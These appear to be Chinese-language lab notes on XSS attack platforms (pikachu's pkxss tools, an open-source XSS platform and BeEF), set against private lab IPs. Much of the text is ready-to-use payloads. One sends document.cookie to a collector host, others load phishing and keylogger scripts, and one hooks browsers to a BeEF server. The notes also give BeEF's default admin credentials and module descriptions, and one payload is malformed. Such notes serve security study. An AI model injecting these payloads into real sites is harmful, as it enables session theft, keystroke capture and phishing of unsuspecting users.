# pikachu的XSS平台

## 基于反射型GET  



### 获取Cookie 

#### 源码

http://192.168.70.130/pkxss/xcookie/cookie.php 

#### payload1

修改输入长度 

```javascript
<script>document.location='http://192.168.70.130/pkxss/xcookie/cookie.php/cookie='+document.cookie;</script>
```

#### payload2

```shell
http://192.168.70.130/vul/xss/xss_reflected_get.php?message=<script>document.location='http://192.168.70.130/pkxss/xcookie/cookie.php?cookie='+document.cookie;</script>&submit=submit
```



## 基于反射型POST 

访问地址 

http://192.168.70.130/pkxss/xcookie/post.html



## 基于存储型

### 钓鱼

#### 源码

http://192.168.70.130/pkxss/xfish/fish.php 

#### payload

```javascript
<script src="<script src="http://192.168.70.130/pkxss/xfish/fish.php"></script>
```



### 键盘记录 

#### 源码 

http://192.168.70.130/pkxss/rkeypress/rk.js 

#### payload

```javascript
<script src="http://192.168.70.130/pkxss/rkeypress/rk.js"></script>
```



# 开源XSS平台

源码

https://github.com/78778443/xssplatform 

安装流程

 https://mp.weixin.qq.com/s/BeTEMmTX93w4B3jThDZgYA



# **beef-xss**

全称：The Browser Exploitation Framework

https://beefproject.com/

https://github.com/beefproject/beef/wiki/

##  安装和启动命令 

```
beef-xss
```



## 管理后台

http://192.168.31.76:3000/ui/panel 

**用户名 :beef** 

**密码 :bebeef**

配置文件：/etc/beef-xss/config.yaml 

## 钩子地址

http://192.168.31.76:3000/hook.js 

payload 

```javascript
<script src="http://192.168.31.76:3000/hook.js"></script>
```

## 模块

### Detials 

浏览器、插件版本信息，操作系统信息 

### Logs 

浏览器动作：焦点变化，鼠标单击，信息输入 

### commands

- 绿色模块：表示模块适用当前用户，并且执行结果对用户不可见 
- 红色模块：表示模块不适用当前用户，有些红色模块也可以执行 
- 橙色模块：模块可用，但结果对用户可见 
- 灰色模块：模块为在目标浏览器上测试过 

### XSS Rays

XSS扫描工具 

https://github.com/beefproject/beef/wiki/xss-ray